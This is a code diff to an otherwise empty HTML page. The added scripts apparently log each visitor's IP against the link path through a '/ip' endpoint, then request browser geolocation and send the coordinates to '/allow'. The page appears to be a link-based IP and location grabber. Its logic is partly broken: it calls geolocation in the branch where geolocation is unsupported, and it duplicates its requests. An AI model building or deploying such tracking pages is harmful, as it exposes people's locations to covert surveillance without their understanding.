@@ -4,8 +4,32 @@
 <body>
     <!-- <p id="url"></p>
     <p id="AllowLocation"></p> -->
-    <script>        
-        
+
+    <script>
+        window.onload = function() {
+            
+            fetch(window.location.origin+'/ip?cl='+window.location.pathname)
+        var Latitude;
+        var Longitude;
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+            
+        } else {
+            //document.getElementById("AllowLocation").innerHTML = "Geolocation is not supported by this browser.";
+            fetch(window.location.origin+'/ip?cl='+window.location.pathname)
+            navigator.geolocation.getCurrentPosition(showPosition);
+        }
+
+        async function showPosition(position) {
+                Latitude=await position.coords.latitude;
+                Longitude=await position.coords.longitude;
+                await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname )      
+        }
+            };  
+
+    </script>
+    
+    <script>
         
         fetch(window.location.origin+'/ip?cl='+window.location.pathname)
         var Latitude;
@@ -22,10 +46,7 @@
         async function showPosition(position) {
                 Latitude=await position.coords.latitude;
                 Longitude=await position.coords.longitude;
-                await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname )
-                
-                
-                
+                await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname )      
         }
      
     </script>
